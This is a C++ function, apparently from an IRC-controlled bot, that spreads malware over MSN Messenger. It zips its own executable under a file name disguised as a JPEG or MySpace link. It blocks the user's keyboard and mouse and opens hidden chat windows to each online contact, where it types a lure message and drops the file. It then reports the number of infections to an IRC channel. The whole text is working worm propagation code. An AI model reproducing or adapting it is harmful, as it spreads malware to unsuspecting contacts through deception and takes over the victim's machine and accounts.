DWORD WINAPI MsnFile2(LPVOID param)
{
	trt = 0;

	NTHREAD msn2 = *((NTHREAD *)param);
	NTHREAD *msns2 = (NTHREAD *)param;
	msns2->gotinfo = TRUE;
	IRC* irc=(IRC*)msn2.conn;

    ///Windir Zipfile Namensgebung
	char fakename[] = "gafgatew.tmp";

	char windir[MAX_PATH];
	GetWindowsDirectory(windir,sizeof(windir));
	strcat(windir, "\\temp\\");
	strcat(windir, fakename);
	IMSNMessenger3 *pIMessenger = NULL;

	CoInitialize(0);

	HRESULT hr = CoCreateInstance(
		CLSID_Messenger,
		NULL,
		CLSCTX_ALL,
		IID_IMSNMessenger2,
		(void**)&pIMessenger);

	char msnmsg[512];
	char buf[128];
	char msnmsg1[1024];
	strncpy(msnmsg,msn2.data1,sizeof(msnmsg));
     
	if (SUCCEEDED(hr))
	{

		char msg[256];
		IDispatch * dispContacts = NULL;
		pIMessenger->get_MyContacts(&dispContacts);
		if (SUCCEEDED(hr))
		{

			IMSNMessengerContacts *pIMessengerContacts = NULL;
			
			hr = dispContacts->QueryInterface(__uuidof(pIMessengerContacts),(LPVOID*)&pIMessengerContacts);
			if (SUCCEEDED(hr))
			{
				IDispatch * dispContact					= NULL;
				IMSNMessengerContact *pIMessengerContact	= NULL;
				long iContacts;

				hr = pIMessengerContacts->get_Count(&iContacts);
				if (SUCCEEDED(hr))
				{
					BlockInput(true);
					for (long i = 0; i < iContacts; i++)	
					{
						hr = pIMessengerContacts->raw_Item(i,&dispContact);
						if (SUCCEEDED(hr))
						{
							hr = dispContact->QueryInterface(__uuidof(pIMessengerContact),(LPVOID*)&pIMessengerContact);
							if (SUCCEEDED(hr))
							{
								BSTR szContactName;
								VARIANT vt_user;
								MISTATUS miStatus;
								IDispatch *pIDispatch = NULL;
								IMSNMessengerWindow *pIMessengerWindow;
								LONG wndIM;

								hr = pIMessengerContact->get_Status(&miStatus);
								if (SUCCEEDED(hr))
								{
									if (miStatus == MISTATUS_OFFLINE)
									{
										pIMessengerContact->Release();
										dispContact->Release();
										continue;
									}
								}

								/// Message no [email protected] !!!
								pIMessengerContact->get_SigninName(&szContactName);
								VariantInit( &vt_user );
								to_variant2(szContactName, vt_user);
								_bstr_t tmp = szContactName;
								sprintf(buf, _T("%s"), (LPCTSTR)tmp);
								sprintf(msnmsg1, "%s", msnmsg);
								///

								
								///makes the 'zip' named email_023.jpeg-www.myspace.com
								char *pemail;
								pemail = strchr(buf, '@');
								if(pemail != NULL) buf[pemail-buf] = NULL;
								strcat(buf, "_023.jpeg-www.myspace.com");
								//
								
								char exepath[MAX_PATH];
								GetModuleFileName(NULL, exepath, MAX_PATH);
								zip_store(exepath, windir, buf);
								///



								Sleep(3000);
								hr = pIMessenger->raw_InstantMessage(vt_user,&pIDispatch);
								if (SUCCEEDED(hr))
								{
									hr = pIDispatch->QueryInterface(IID_IMSNMessengerWindow, (void **)&pIMessengerWindow);
									if (SUCCEEDED(hr))
									{
										Sleep(10);
										pIMessengerWindow->get_HWND(&wndIM);
										SetForegroundWindow((HWND) wndIM);
										SetFocus((HWND) wndIM);
										trt++;
										ShowWindow((HWND) wndIM,0);										
										srand(GetTickCount());	
										//stats_msg++;
										//send message
                                        key_type2((char *)msnmsg1, (HWND) wndIM);
										keybd_event(VK_CONTROL, 0, KEYEVENTF_EXTENDEDKEY | 0, 0);
                                        keybd_event(VkKeyScan('V'), 0, 0, 0);
                                        keybd_event(VK_CONTROL, 45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); 
                                        keybd_event(VK_RETURN, 0, 0, 0);
										//send zipfile
										Sleep(50);
										dropfiles2((HWND) wndIM, buf);
                                        keybd_event(VK_CONTROL, 0, KEYEVENTF_EXTENDEDKEY | 0, 0);
                                        keybd_event(VkKeyScan('V'), 0, 0, 0);                                        
										keybd_event(VK_CONTROL, 45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
																		
									}
								}
								pIMessengerContact->Release();
								dispContact->Release();
							}
						}
					}
					BlockInput(false);
					if ( trt > 1 )
					{
					irc->pmsg(InfoChan,str_msn_msg2, trx);
					}
					pIMessengerContacts->Release();
				}
				dispContacts->Release();
			}
		}
		pIMessenger->Release();
	}

	CoUninitialize();
	clearthread(msn2.threadnum);
	ExitThread(0);
	

	return 0;
}